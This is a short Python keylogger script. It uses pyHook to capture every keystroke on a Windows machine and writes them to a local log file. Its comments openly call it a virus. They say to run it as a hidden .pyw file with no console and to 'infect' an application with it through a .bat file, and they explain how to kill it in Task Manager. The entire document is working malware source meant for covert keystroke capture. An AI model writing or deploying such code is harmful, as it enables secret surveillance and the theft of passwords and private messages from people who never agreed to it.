#Infect the Application with This VIRUS with the Help of a .bat File
#MAke this as .pyw(No console....)
import pyHook,pythoncom,sys,logging

file_log = "G://Python DB//KeyLogger.txt"

def OnKeyboardEvent(event):
    logging.basicConfig(filename = file_log , level = logging.DEBUG , format = '%(message)s')
    chr(event.Ascii)
    logging.log(10 , chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
#To End Virus...
#Close this in TaskMAnager
#Close pyw.exe in TaskManager